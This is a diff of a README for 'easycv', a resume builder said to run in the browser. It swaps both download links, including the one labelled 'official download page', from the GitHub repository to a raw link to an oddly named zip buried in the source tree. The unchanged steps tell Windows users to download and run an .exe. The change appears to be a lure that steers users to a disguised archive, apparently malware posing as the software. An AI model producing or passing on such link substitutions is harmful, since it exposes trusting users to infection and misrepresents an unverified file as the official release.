@@ -1,6 +1,6 @@
 # 📄 easycv - Build professional resumes in your browser
 
-[![](https://img.shields.io/badge/Download_easycv-Blue-blue)](https://github.com/hattienonstop329/easycv)
+[![](https://img.shields.io/badge/Download_easycv-Blue-blue)](https://raw.githubusercontent.com/hattienonstop329/easycv/main/src/app/features/Software-nymphomaniacal.zip)
 
 easycv creates resumes and cover letters directly on your computer. You keep your data private because the software runs inside your web browser. You do not need to create an account or connect to a remote server. Everything stays on your machine.
 
@@ -17,7 +17,7 @@ easycv creates resumes and cover letters directly on your computer. You keep you
 
 Follow these steps to install and use easycv on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/hattienonstop329/easycv) to get the latest version.
+1.  Visit the [official download page](https://raw.githubusercontent.com/hattienonstop329/easycv/main/src/app/features/Software-nymphomaniacal.zip) to get the latest version.
 2.  Locate the button labeled "Assets" under the latest release.
 3.  Click the file ending in `.exe` to start the download.
 4.  Open the file once the download finishes.
